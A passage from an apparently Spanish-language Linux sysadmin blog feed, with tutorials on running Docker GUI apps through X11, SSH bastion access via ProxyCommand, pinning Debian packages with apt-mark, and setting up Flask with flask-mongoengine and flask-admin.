&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/retext$ docker run --rm retext
QXcbConnection: Could not connect to display 
gerard@sirius:~/docker/retext$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por suerte podemos añadir ambos mediante &lt;em&gt;flags&lt;/em&gt; durante la ejecución del contenedor. Vamos a añadir el &lt;em&gt;unix socket&lt;/em&gt; del servidor gráfico mediante un volumen, y vamos a definir la variable &lt;em&gt;DISPLAY&lt;/em&gt; en función de la que tengamos en la máquina anfitrión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/retext$ docker run --rm -e &lt;span class="s2"&gt;&amp;quot;DISPLAY=&lt;/span&gt;&lt;span class="nv"&gt;$DISPLAY&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -v /tmp/.X11-unix:/tmp/.X11-unix retext
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podremos ver la aplicación corriendo como una ventana más en nuestra pantalla, sin problemas ni complicaciones.&lt;/p&gt;</content><category term="docker"></category><category term="escritorio"></category></entry><entry><title>Usando un bastión SSH</title><link href="http://www.linuxsysadmin.ml/2018/01/usando-un-bastion-ssh.html" rel="alternate"></link><published>2018-01-02T10:00:00+01:00</published><updated>2018-01-02T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-02:/2018/01/usando-un-bastion-ssh.html</id><summary type="html">&lt;p&gt;Hoy vamos a presentar un patrón de conectividad para acceder a un conjunto de máquinas, exponiendo solamente una de ellas, y aprovechando el protocolo SSH para pasar el tráfico a través, de forma transparente. Eso facilita los casos en los que no podemos tener una VPN o una red dedicada …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hoy vamos a presentar un patrón de conectividad para acceder a un conjunto de máquinas, exponiendo solamente una de ellas, y aprovechando el protocolo SSH para pasar el tráfico a través, de forma transparente. Eso facilita los casos en los que no podemos tener una VPN o una red dedicada.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que tenemos un entorno con 4 máquinas, una de las cuales tiene el protocolo SSH abierto a una red menos confiable. Por supuesto, en casos así se recomienda encarecidamente no permitir la autenticación por claves, ya que os pueden acabar entrando usando ataques de fuerza bruta o de diccionario.&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSH bastion host" src="http://www.linuxsysadmin.ml/images/ssh-bastion-host.png"&gt;&lt;/p&gt;
&lt;p&gt;En nuestro caso vamos a llamar a la primera máquina como &lt;em&gt;bastion&lt;/em&gt; y las otras tres como &lt;em&gt;server1&lt;/em&gt;, &lt;em&gt;server2&lt;/em&gt; y &lt;em&gt;server3&lt;/em&gt; respectivamente. Todas ellas disponen de acceso por claves SSH y un usuario dedicado. No hace falta que ninguna de las máquinas tenga las mismas claves ni los mismos usuarios, pero hacerlo nos va a facilitar bastante la configuración SSH del cliente. En nuestro caso vamos a usar la misma clave para todos y el mismo usuario &lt;em&gt;jump&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El truco está en usar la directiva &lt;em&gt;ProxyCommand&lt;/em&gt; para que el tráfico hacia los servidores privados se haga &lt;strong&gt;a través&lt;/strong&gt; de una sesión SSH al servidor &lt;em&gt;bastion&lt;/em&gt;. Es importante decir que para que esto pase, el servidor &lt;em&gt;bastion&lt;/em&gt; debe poder resolver el nombre de la máquina que pasemos al comando SSH, ya que es lo que se va a usar para acceder a la misma.&lt;/p&gt;
&lt;p&gt;Para hacerme la vida más fácil he creado los usuarios mediante un &lt;em&gt;playbook&lt;/em&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, aunque esto es opcional. Basta con crear los usuarios y poner la clave SSH pública en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ cat create_users.yml 
- hosts: all
  gather_facts: no
  tasks:
    - user: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/bash &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - file: &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/jump/.ssh &lt;span class="nv"&gt;owner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;directory
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;../keys/id_jump.pub &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/jump/.ssh/authorized_keys &lt;span class="nv"&gt;owner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump &lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jump
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí definimos dos reglas en nuestra configuración SSH cliente; una para el servidor &lt;em&gt;bastion&lt;/em&gt; (que no necesita de un &lt;em&gt;proxy&lt;/em&gt; SSH) y otra serie de reglas para las que sí necesitan del &lt;em&gt;proxy&lt;/em&gt;. Fijaos que cuentan cada una con su propio usuario y su clave SSH, que son la misma, pero podrían ser diferentes. Además, como la configuración de los servidores privados coincide, podemos acortar usando las mismas directivas para los 3 &lt;em&gt;hosts&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ cat .ssh/config 
...
Host bastion
    HostName &lt;span class="m"&gt;172&lt;/span&gt;.20.0.4
    User jump
    IdentityFile ~/.ssh/id_jump

Host server1 server2 server3
    User jump
    IdentityFile ~/.ssh/id_jump
    ProxyCommand ssh -F ssh_config -W %h:%p bastion
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda comprobar que podemos acceder a la máquina &lt;em&gt;bastion&lt;/em&gt; sin problemas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ ssh bastion uname -a
Linux bastion &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y también podemos comprobar que llegamos a las máquinas a las que de otra forma no llegaríamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@purgatory:~$ ssh server1 uname -a
Linux server1 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ ssh server2 uname -a
Linux server2 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ ssh server3 uname -a
Linux server3 &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-amd64 &lt;span class="c1"&gt;#1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux&lt;/span&gt;
gerard@purgatory:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es interesante comprobar que tras acceder desde nuestra máquina, la segunda sesión nos informa que la anterior se realizó desde &lt;em&gt;bastion&lt;/em&gt;, y no desde la nuestra; la nuestra se conecta a &lt;em&gt;bastion&lt;/em&gt; que es la que se conecta al resto, llegando a servidores en los que no habríamos llegado de otra manera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ssh server1
...  
Last login: Thu Nov &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:35:30 &lt;span class="m"&gt;2016&lt;/span&gt; from bastion
jump@server1:~$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="ssh"></category><category term="bastion"></category><category term="pubkey"></category></entry><entry><title>Manteniendo la versión de paquetes en Debian y Ubuntu</title><link href="http://www.linuxsysadmin.ml/2017/12/manteniendo-la-version-de-paquetes-en-debian-y-ubuntu.html" rel="alternate"></link><published>2017-12-26T10:00:00+01:00</published><updated>2017-12-26T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-12-26:/2017/12/manteniendo-la-version-de-paquetes-en-debian-y-ubuntu.html</id><summary type="html">&lt;p&gt;Una de las operaciones más rutinarias que podemos tener como administradores de sistemas Linux es la actualización de un servidor. Mecánicamente lanzas &lt;strong&gt;apt-get upgrade&lt;/strong&gt; y te quedas tan tranquilo con la tarea completa. Poco después te encuentras con alguien cabreado porque alguna librería o servicio no va adecuadamente como antes …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las operaciones más rutinarias que podemos tener como administradores de sistemas Linux es la actualización de un servidor. Mecánicamente lanzas &lt;strong&gt;apt-get upgrade&lt;/strong&gt; y te quedas tan tranquilo con la tarea completa. Poco después te encuentras con alguien cabreado porque alguna librería o servicio no va adecuadamente como antes.&lt;/p&gt;
&lt;p&gt;Lo que realmente ha pasado es que hemos cambiado de versión alguna pieza de &lt;em&gt;software&lt;/em&gt;, y la nueva tiene incompatibilidades con lo que hay funcionando. Es un caso raro, pero a veces se da, y muchas veces con previo aviso.&lt;/p&gt;
&lt;p&gt;¿Como se puede evitar que un servicio cambie de versión cuando actualiza? Muy sencillo: se llama &lt;em&gt;pinning&lt;/em&gt; y es muy fácil de hacer con &lt;strong&gt;Debian&lt;/strong&gt; o &lt;strong&gt;Ubuntu&lt;/strong&gt;. Veamos un ejemplo:&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos un servidor de contenedores &lt;strong&gt;Docker&lt;/strong&gt;. Por un tema de estabilidad queremos mantener la versión actual. Para ello necesitamos saber el nombre del paquete que queramos congelar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dpkg -l &lt;span class="p"&gt;|&lt;/span&gt; grep docker
ii  docker-ce                     &lt;span class="m"&gt;17&lt;/span&gt;.09.0~ce-0~debian            amd64        Docker: the open-source application container engine
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En nuestro caso, el paquete es &lt;strong&gt;docker-ce&lt;/strong&gt;. Solo hace falta utilizar el comando &lt;strong&gt;apt-mark&lt;/strong&gt; para que lo mantenga en la version actual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark hold docker-ce
docker-ce fijado como retenido.
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de ahora, este paquete &lt;strong&gt;no se va a actualizar&lt;/strong&gt;. Si queremos ver que paquetes tenemos congelados, el mismo comando ofrece la operación &lt;em&gt;showhold&lt;/em&gt; que nos listaría los paquetes en modo &lt;em&gt;pinning&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark showhold
docker-ce
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si en algún momento quisieramos volver a actualizarlo, bastaría con quitarle el &lt;em&gt;hold&lt;/em&gt;, con el mismo comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark unhold docker-ce
Se ha cancelado la retención de docker-ce.
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora ya podríamos modificar la versión de &lt;strong&gt;docker-ce&lt;/strong&gt;. Necesitaríamos los comandos habituales &lt;strong&gt;apt-get&lt;/strong&gt;, &lt;strong&gt;aptitude&lt;/strong&gt; u otro frontal gráfico. Podéis verificar que vuestro paquete ya no está en modo &lt;em&gt;hold&lt;/em&gt; listando los paquetes en dicho estado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ sudo apt-mark showhold
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos evitamos esos molestos cambios de versión que nos traen incompatibilidades con las aplicaciones que mantenemos.&lt;/p&gt;</content><category term="debian"></category><category term="ubuntu"></category><category term="apt"></category><category term="apt-mark"></category><category term="pinning"></category></entry><entry><title>Usando extensiones en Flask</title><link href="http://www.linuxsysadmin.ml/2017/12/usando-extensiones-en-flask.html" rel="alternate"></link><published>2017-12-18T10:00:00+01:00</published><updated>2017-12-18T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-12-18:/2017/12/usando-extensiones-en-flask.html</id><summary type="html">&lt;p&gt;Muchos de los &lt;em&gt;microframeworks&lt;/em&gt; que existen en &lt;strong&gt;python&lt;/strong&gt; no ofrecen ninguna ayuda con las tareas más simples que toda aplicación acaba implementando; eso nos hace decantarnos casi siempre por una opción más pesada de &lt;em&gt;framework&lt;/em&gt;, como por ejemplo, &lt;strong&gt;Django&lt;/strong&gt;. Sin embargo, gracias a los &lt;strong&gt;blueprints&lt;/strong&gt; de &lt;strong&gt;Flask&lt;/strong&gt;, esto es innecesario …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchos de los &lt;em&gt;microframeworks&lt;/em&gt; que existen en &lt;strong&gt;python&lt;/strong&gt; no ofrecen ninguna ayuda con las tareas más simples que toda aplicación acaba implementando; eso nos hace decantarnos casi siempre por una opción más pesada de &lt;em&gt;framework&lt;/em&gt;, como por ejemplo, &lt;strong&gt;Django&lt;/strong&gt;. Sin embargo, gracias a los &lt;strong&gt;blueprints&lt;/strong&gt; de &lt;strong&gt;Flask&lt;/strong&gt;, esto es innecesario.&lt;/p&gt;
&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2017/12/creciendo-con-flask-los-blueprints.html"&gt;otro artículo&lt;/a&gt; que este &lt;em&gt;framework&lt;/em&gt; tiene una funcionalidad llamada &lt;strong&gt;blueprints&lt;/strong&gt;, que nos permiten encapsular un subconjunto de rutas, vistas y contenido estático para mantenibilidad y para su uso en otros proyectos.&lt;/p&gt;
&lt;p&gt;Este mismo modelo de desarrollo ha permitido que muchas personas desarrollen sus &lt;strong&gt;blueprints&lt;/strong&gt; reusables y, en alguno de los casos, ofrecerlos a cualquiera que los pueda necesitar. Son especialmente interesantes las extensiones oficiales que se ofrecen con &lt;strong&gt;Flask&lt;/strong&gt;, que podemos encontrar en &lt;a href="http://flask.pocoo.org/extensions/"&gt;la página de extensiones&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Hay una lista interesante de extensiones, tanto en la página oficial, como por otros lugares de internet; cualquiera puede ofrecer extensiones. A pesar de ello, hay extensiones de plena confianza que van a servir de base para casi cualquier proyecto que deseemos empezar.&lt;/p&gt;
&lt;p&gt;En mi caso, mis favoritas son &lt;strong&gt;flask-mongoengine&lt;/strong&gt; y &lt;strong&gt;flask-admin&lt;/strong&gt; y suelen ser motivo suficiente para empezar cada nuevo proyecto en &lt;strong&gt;Flask&lt;/strong&gt;. Vamos a intentar introducir el uso de extensiones con estos dos ejemplos.&lt;/p&gt;
&lt;h2&gt;Un proyecto vacío&lt;/h2&gt;
&lt;p&gt;Todas las modificaciones que se van a ir haciendo, se basan en una aplicación básica vacía. Siguiendo nuestra metodología, vamos a utilizar &lt;em&gt;virtualenv&lt;/em&gt;, vamos recoger las dependencias en un fichero &lt;em&gt;requirements.txt&lt;/em&gt; y vamos a disponer de un servidor de desarrollo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat requirements.txt
&lt;span class="nv"&gt;Flask&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.2
Flask-Admin&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.5.0
flask-mongoengine&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.9.3
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat server.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nv"&gt;PYTHONDONTWRITEBYTECODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;FLASK_DEBUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;FLASK_APP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;app.py &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;MONGODB_URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb://localhost:27017/test&amp;#39;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="nv"&gt;SECRET_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1234567890&amp;#39;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
flask run --host &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 --port &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat app.py
from flask import Flask

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sobra decir que tenemos un servidor de &lt;strong&gt;mongodb&lt;/strong&gt; en alguna parte, dispuesto a ser utilizado por nuestra capa de datos. En este caso concreto, el servidor corre en local.&lt;/p&gt;
&lt;h2&gt;Definiendo el modelo con flask-mongoengine&lt;/h2&gt;
&lt;p&gt;Esta extensión no añade demasiado valor en sí misma, pero se integra magníficamente con &lt;strong&gt;Flask&lt;/strong&gt;. En esencia se trata de un &lt;strong&gt;blueprint&lt;/strong&gt; que utiliza la misma configuración que nuestra aplicación y se conecta al servidor de acuerdo a esta configuración.&lt;/p&gt;
&lt;p&gt;Vamos a definir nuestros modelos como lo haríamos en &lt;strong&gt;mongoengine&lt;/strong&gt;, salvo que los tipos declarados en &lt;strong&gt;mongoengine&lt;/strong&gt; también lo están dentro del &lt;strong&gt;blueprint&lt;/strong&gt; que hemos creado. Con un modelo pequeño de demostración nos vale:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat models.py
from flask_mongoengine import MongoEngine

&lt;span class="nv"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; MongoEngine&lt;span class="o"&gt;()&lt;/span&gt;


class User&lt;span class="o"&gt;(&lt;/span&gt;db.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;fullname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;


class Product&lt;span class="o"&gt;(&lt;/span&gt;db.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;sku&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;products&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a recurrir a la clase principal (que es la que declara el objeto &lt;em&gt;app&lt;/em&gt;) y vamos a importar el &lt;strong&gt;blueprint&lt;/strong&gt;, para registrarlo posteriormente. Como añadido, vamos a sacar la URL de &lt;strong&gt;mongodb&lt;/strong&gt; de una variable de entorno, porque la idea es usar esta aplicación en un contenedor en el futuro; de momento, esta variable queda declarada en el fichero &lt;em&gt;server.sh&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat app.py
from flask import Flask
from models import db
import os

&lt;span class="nv"&gt;MONGODB_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; os.environ.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MONGODB_URL&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Flask&lt;span class="o"&gt;(&lt;/span&gt;__name__&lt;span class="o"&gt;)&lt;/span&gt;
app.config&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MONGODB_SETTINGS&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;: MONGODB_URL&lt;span class="o"&gt;}&lt;/span&gt;
db.init_app&lt;span class="o"&gt;(&lt;/span&gt;app&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los modelos definidos con &lt;strong&gt;flask-mongoengine&lt;/strong&gt; disponen de un &lt;em&gt;QuerySet&lt;/em&gt; modificado, que nos permitirá hacer paginación o lanzar automáticamente un error 404 si no se encuentra un elemento, pero eso ya queda como deberes para el lector.&lt;/p&gt;
&lt;h2&gt;Una interfaz de administración gratuita con flask-admin&lt;/h2&gt;
&lt;p&gt;Esta extensión trabaja más que la anterior, pero en cierta manera, depende de ella. Se trata de un &lt;strong&gt;blueprint&lt;/strong&gt; que crea un interfaz de administración en base a los modelos y de unas clases &lt;em&gt;ModelView&lt;/em&gt; que son capaces de analizar los mismos y crear automáticamente las listas y formularios necesarios.&lt;/p&gt;
&lt;p&gt;La idea es la misma: creamos el &lt;strong&gt;blueprint&lt;/strong&gt; y registramos el objeto &lt;em&gt;ModelView&lt;/em&gt; para cada objeto que deseemos en el panel de administración. El objeto básico &lt;em&gt;ModelView&lt;/em&gt; suele ser suficiente para la mayoría de casos, pero en otros vamos a querer personalizar lo que se ve, lo que se puede hacer, y los filtros disponibles.&lt;/p&gt;
&lt;p&gt;Esto lo dejamos para el lector, y nos vamos a centrar en como se haría. Para ello, imaginemos que queremos ocultar el campo &lt;em&gt;password&lt;/em&gt; en la gestión de usuarios:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat models.py
from flask_mongoengine import MongoEngine

&lt;span class="nv"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; MongoEngine&lt;span class="o"&gt;()&lt;/span&gt;


class User&lt;span class="o"&gt;(&lt;/span&gt;db.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;fullname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;


class Product&lt;span class="o"&gt;(&lt;/span&gt;db.Document&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;sku&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; db.StringField&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="nv"&gt;meta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;collection&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;products&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@atlantis:~/projects/flask-extensions$ cat admin.py
from flask_admin import Admin
from flask_admin.contrib.mongoengine import ModelView
from models import User, Product


class HidePasswordModelView&lt;span class="o"&gt;(&lt;/span&gt;ModelView&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;column_exclude_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;admin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Admin&lt;span class="o"&gt;()&lt;/span&gt;
